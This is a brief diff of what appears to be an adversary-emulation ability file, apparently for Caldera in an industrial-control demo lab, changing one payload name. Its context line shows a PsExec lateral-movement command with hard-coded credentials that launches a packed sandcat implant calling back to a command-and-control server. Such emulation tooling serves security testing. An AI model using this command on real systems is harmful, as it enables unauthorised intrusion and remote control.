@@ -17,7 +17,7 @@
           Start-Process -FilePath "C:\Users\Public\psexec.exe" -ArgumentList '\\172.18.24.12', '-u', 'txone', '-p', 'tx1otdemo', 'cmd', '/c', 'start "" "C:\Users\Public\sandcat-upx.exe" -server http://172.18.25.10:8888 -group tx1' -NoNewWindow;
         payloads:
           - sandcat-upx.exe
-          - sandcat-upx86.exe
+          - sandcat.exe
           - modbus_cli.exe
           - psexec.exe
   requirements:
